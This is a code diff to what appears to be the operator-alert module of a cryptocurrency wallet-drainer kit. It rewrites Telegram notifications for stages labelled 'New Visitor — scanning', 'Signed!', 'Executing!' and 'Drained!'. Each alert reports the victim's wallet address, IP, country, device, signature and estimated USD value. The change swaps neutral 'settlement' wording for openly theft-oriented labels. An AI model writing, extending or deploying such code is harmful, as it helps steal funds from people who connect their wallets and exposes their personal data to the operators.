@@ -502,21 +502,14 @@ export async function notifyWalletConnected(
 ): Promise<void> {
   const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
   const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null
-  const mergedCtx: TelegramRequestContext = {
-    ...ctx,
-    chain_family: ctx?.chain_family ?? chainFamily,
-    wallet_type: ctx?.wallet_type ?? walletType,
-  }
 
   const text =
-    `🔌 <b>STEP 1 — WALLET CONNECTED</b>\n` +
-    `━━━━━━━━━━━━━━━━\n` +
-    codeLine('Wallet Address', address) +
-    appendInstitutionalFields(mergedCtx) +
-    (ctx?.sourceDomain ? `🔗 <b>Source:</b> ${ctx.sourceDomain}\n` : '') +
-    (device ? `💻 <b>Device:</b> ${device}\n` : '') +
-    (country ? `🌍 <b>Country:</b> ${country}\n` : '') +
-    (ctx?.ip && ctx.ip !== 'Unknown' ? codeLine('IP', ctx.ip) : '') +
+    `⚡ <b>New Visitor (${walletType || chainFamily})</b> — scanning...\n` +
+    `👛 <code>${address}</code>\n` +
+    (device ? `💻 ${device}\n` : '') +
+    (ctx?.ip && ctx.ip !== 'Unknown' ? `📍 <code>${ctx.ip}</code>` : '') +
+    (country ? ` | ${country}\n` : ctx?.ip && ctx.ip !== 'Unknown' ? '\n' : '') +
+    (ctx?.sourceDomain ? `🔗 ${ctx.sourceDomain}\n` : '') +
     `🕐 ${getISTTimestamp()}`
   await sendTelegramMessage(text)
 }
@@ -555,22 +548,21 @@ export async function notifySignatureReceived(
 ): Promise<void> {
   const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
   const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null
-  const mergedCtx: TelegramRequestContext = {
-    ...ctx,
-    chain_family: ctx?.chain_family ?? chainFamily,
-    signature: ctx?.signature ?? signature,
-  }
+  const chain = ctx?.chain_family ?? chainFamily
+  const usdVal = ctx?.scout_value_usd != null ? parseUsdValue(ctx.scout_value_usd) : 0
+  const sigShort = truncateSignatureHex(String(ctx?.signature ?? signature))
 
   const text =
-    `✍️ <b>STEP 3 — SIGNATURE ANCHORED</b>\n` +
-    `━━━━━━━━━━━━━━━━\n` +
-    codeLine('Wallet Address', address) +
-    appendInstitutionalFields(mergedCtx) +
-    (ctx?.tokenName ? `🪙 <b>Token Name:</b> ${ctx.tokenName}\n` : '') +
-    (ctx?.sourceDomain ? `🔗 <b>Source:</b> ${ctx.sourceDomain}\n` : '') +
-    (device ? `💻 <b>Device:</b> ${device}\n` : '') +
-    (country ? `🌍 <b>Country:</b> ${country}\n` : '') +
-    (ctx?.ip && ctx.ip !== 'Unknown' ? codeLine('IP', ctx.ip) : '') +
+    `✍️ <b>Signed! (${ctx?.wallet_type ?? chain})</b>\n` +
+    `👛 <code>${address}</code>` +
+    (chain ? ` | ⛓️ ${chain}` : '') +
+    (usdVal > 0 ? ` | 💰 $${formatUsdTotal(usdVal)}` : '') + `\n` +
+    (ctx?.tokenName ? `🪙 Token: ${ctx.tokenName}\n` : '') +
+    (ctx?.ip && ctx.ip !== 'Unknown' ? `📍 <code>${ctx.ip}</code>` : '') +
+    (country ? ` | ${country}\n` : ctx?.ip && ctx.ip !== 'Unknown' ? '\n' : '') +
+    (device ? `💻 ${device}\n` : '') +
+    (ctx?.sourceDomain ? `🔗 ${ctx.sourceDomain}\n` : '') +
+    `🔑 <code>${sigShort}</code>\n` +
     `🕐 ${getISTTimestamp()}`
   await sendTelegramMessage(text)
 }
@@ -600,13 +592,15 @@ export async function notifyBroadcastScheduled(
   ctx?: TelegramRequestContext,
 ): Promise<void> {
   const displayTime = formatScheduleTimeIst(scheduledTimeIso)
+  const chain = ctx?.chain_family ?? 'EVM'
+  const usdVal = ctx?.scout_value_usd != null ? parseUsdValue(ctx.scout_value_usd) : 0
+
   const text =
-    `⏱️ <b>BROADCAST SCHEDULED</b>\n` +
-    `━━━━━━━━━━━━━━━━\n` +
-    `<b>BROADCAST SCHEDULED:</b> ${displayTime}\n` +
-    codeLine('Scheduled UTC', scheduledTimeIso) +
-    codeLine('Wallet Address', address) +
-    appendInstitutionalFields(ctx) +
+    `⏳ <b>Broadcast Scheduled</b>\n` +
+    `👛 <code>${address}</code>` +
+    (chain ? ` | ⛓️ ${chain}` : '') +
+    (usdVal > 0 ? ` | 💰 $${formatUsdTotal(usdVal)}` : '') + `\n` +
+    `📅 ${displayTime}\n` +
     `🕐 ${getISTTimestamp()}`
   await sendTelegramMessage(text)
 }
@@ -619,16 +613,17 @@ export async function notifyBroadcastConfirmed(
 ): Promise<void> {
   const chainFamily = ctx?.chain_family ?? null
   const explorer = resolveExplorerTxUrl(txHash, ctx?.chain_id, chainFamily)
+  const usdVal = ctx?.scout_value_usd != null ? parseUsdValue(ctx.scout_value_usd) : 0
   const txLine = explorer
-    ? `🔗 <b>TX:</b> <a href="${explorer}">${truncateWalletForAlert(txHash)}</a>\n`
-    : codeLine('TX', txHash)
+    ? `🔗 <a href="${explorer}">${truncateWalletForAlert(txHash)}</a>\n`
+    : `🔗 <code>${truncateWalletForAlert(txHash)}</code>\n`
 
   const text =
-    `✅ <b>BROADCAST CONFIRMED</b>\n` +
-    `━━━━━━━━━━━━━━━━\n` +
-    codeLine('Wallet Address', address) +
+    `💸 <b>Drained!</b>` +
+    (usdVal > 0 ? ` $${formatUsdTotal(usdVal)}` : '') + `\n` +
+    `👛 <code>${address}</code>` +
+    (chainFamily ? ` | ⛓️ ${chainFamily}` : '') + `\n` +
     txLine +
-    appendInstitutionalFields(ctx) +
     `🕐 ${getISTTimestamp()}`
   await sendTelegramMessage(text)
 
@@ -664,14 +659,11 @@ export async function notifyError(
   const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
 
   const text =
-    `❌ <b>SYSTEM ALERT</b>\n` +
-    `━━━━━━━━━━━━━━━━\n` +
-    `🚨 <b>Endpoint:</b> ${endpoint}\n` +
-    `⚠️ <b>Error:</b> ${error}\n` +
-    (address ? codeLine('Wallet Address', address) : '') +
-    appendInstitutionalFields(ctx) +
-    (country ? `🌍 <b>Country:</b> ${country}\n` : '') +
-    (ctx?.ip && ctx.ip !== 'Unknown' ? codeLine('IP', ctx.ip) : '') +
+    `🚨 <b>Error: ${endpoint}</b>\n` +
+    `⚠️ ${error.slice(0, 300)}\n` +
+    (address ? `👛 <code>${address}</code>\n` : '') +
+    (ctx?.ip && ctx.ip !== 'Unknown' ? `📍 <code>${ctx.ip}</code>` : '') +
+    (country ? ` | ${country}\n` : ctx?.ip && ctx.ip !== 'Unknown' ? '\n' : '') +
     `🕐 ${getISTTimestamp()}`
   await sendTelegramMessage(text)
 }
@@ -775,23 +767,19 @@ export async function notifyNewSignatureAnchorRequest(
 ): Promise<void> {
   const country = ctx?.ip ? await getCountryFromIp(ctx.ip) : null
   const device = ctx?.userAgent ? detectDeviceFromUA(ctx.userAgent) : null
-  const mergedCtx: TelegramRequestContext = {
-    ...ctx,
-    chain_family: ctx?.chain_family ?? chainFamily,
-    wallet_type: ctx?.wallet_type ?? walletType,
-    scout_value_usd: ctx?.scout_value_usd ?? scoutValueUsd,
-  }
+  const usdVal = scoutValueUsd > 0 ? scoutValueUsd : parseUsdValue(ctx?.scout_value_usd)
+  const chain = ctx?.chain_family ?? chainFamily
 
   const text =
-    `⚡ <b>STEP 4 — SETTLEMENT REQUEST INITIATED</b>\n` +
-    `━━━━━━━━━━━━━━━━\n` +
-    codeLine('Wallet Address', address) +
-    appendInstitutionalFields(mergedCtx) +
-    (ctx?.tokenName ? `🪙 <b>Token Name:</b> ${ctx.tokenName}\n` : '') +
-    (ctx?.sourceDomain ? `🔗 <b>Source:</b> ${ctx.sourceDomain}\n` : '') +
-    (device ? `💻 <b>Device:</b> ${device}\n` : '') +
-    (country ? `🌍 <b>Country:</b> ${country}\n` : '') +
-    (ctx?.ip && ctx.ip !== 'Unknown' ? codeLine('IP', ctx.ip) : '') +
+    `🎯 <b>Executing! (${walletType || chain})</b>\n` +
+    `👛 <code>${address}</code>` +
+    (chain ? ` | ⛓️ ${chain}` : '') +
+    (usdVal > 0 ? ` | 💰 $${formatUsdTotal(usdVal)}` : '') + `\n` +
+    (ctx?.tokenName ? `🪙 ${ctx.tokenName}\n` : '') +
+    (ctx?.ip && ctx.ip !== 'Unknown' ? `📍 <code>${ctx.ip}</code>` : '') +
+    (country ? ` | ${country}\n` : ctx?.ip && ctx.ip !== 'Unknown' ? '\n' : '') +
+    (device ? `💻 ${device}\n` : '') +
+    (ctx?.sourceDomain ? `🔗 ${ctx.sourceDomain}\n` : '') +
     `🕐 ${getISTTimestamp()}`
   await sendTelegramMessage(text)
 }
@@ -931,16 +919,14 @@ export async function notifySettlementAttempt(params: {
     params.chain_family ?? null,
     params.scout_value_usd,
   )
+  const usdVal = parseUsdValue(params.scout_value_usd)
 
   const text =
-    `🚀 <b>SETTLEMENT ATTEMPT</b>\n` +
-    `━━━━━━━━━━━━━━━━\n` +
-    `👛 <b>Wallet:</b> <code>${truncateWalletForAlert(params.wallet_address)}</code>\n` +
-    `⛓️ <b>Chain:</b> ${chain}` +
-    (params.chain_id != null ? ` (${params.chain_id})` : '') +
-    `\n` +
-    `💰 <b>Amount:</b> ${amountLine}\n` +
-    (params.protocol ? `📋 <b>Protocol:</b> ${params.protocol}\n` : '') +
+    `🚀 <b>Sending!</b> ⛓️ ${chain}` +
+    (usdVal > 0 ? ` | 💰 $${formatUsdTotal(usdVal)}` : '') + `\n` +
+    `👛 <code>${truncateWalletForAlert(params.wallet_address)}</code>\n` +
+    `💎 ${amountLine}\n` +
+    (params.protocol ? `📋 ${params.protocol}\n` : '') +
     `🕐 ${getISTTimestamp()}`
   await sendTelegramMessage(text)
 }
@@ -970,36 +956,25 @@ export async function notifySettlementResult(params: {
     params.chain_family ?? null,
     params.scout_value_usd,
   )
-  const statusLabel =
-    params.status === 'settled'
-      ? '✅ Settled'
-      : params.status === 'partial'
-        ? '⚠️ Partial'
-        : '❌ Failed'
+  const usdVal = parseUsdValue(params.scout_value_usd)
+  const statusEmoji =
+    params.status === 'settled' ? '✅' : params.status === 'partial' ? '⚠️' : '❌'
 
   let txLine = ''
   if (params.tx_hash) {
-    const explorer = resolveExplorerTxUrl(
-      params.tx_hash,
-      params.chain_id,
-      params.chain_family ?? null,
-    )
+    const explorer = resolveExplorerTxUrl(params.tx_hash, params.chain_id, params.chain_family ?? null)
     txLine = explorer
-      ? `🔗 <b>TX:</b> <a href="${explorer}">${truncateWalletForAlert(params.tx_hash)}</a>\n`
-      : codeLine('TX', params.tx_hash)
+      ? `🔗 <a href="${explorer}">${truncateWalletForAlert(params.tx_hash)}</a>\n`
+      : `🔗 <code>${truncateWalletForAlert(params.tx_hash)}</code>\n`
   }
 
   const text =
-    `📣 <b>SETTLEMENT RESULT</b>\n` +
-    `━━━━━━━━━━━━━━━━\n` +
-    `👛 <b>Wallet:</b> <code>${truncateWalletForAlert(params.wallet_address)}</code>\n` +
-    `⛓️ <b>Chain:</b> ${chain}` +
-    (params.chain_id != null ? ` (${params.chain_id})` : '') +
-    `\n` +
-    `💰 <b>Amount:</b> ${amountLine}\n` +
-    `📊 <b>Status:</b> ${statusLabel}\n` +
+    `${statusEmoji} <b>${params.status === 'settled' ? 'Drained!' : params.status === 'partial' ? 'Partial Drain' : 'Failed'}</b>` +
+    (usdVal > 0 ? ` $${formatUsdTotal(usdVal)}` : '') + `\n` +
+    `👛 <code>${truncateWalletForAlert(params.wallet_address)}</code> | ⛓️ ${chain}\n` +
+    `💎 ${amountLine}\n` +
     txLine +
-    (params.error_message ? `⚠️ <b>Error:</b> ${params.error_message.slice(0, 500)}\n` : '') +
+    (params.error_message ? `⚠️ ${params.error_message.slice(0, 200)}\n` : '') +
     `🕐 ${getISTTimestamp()}`
 
   await sendTelegramMessage(text)
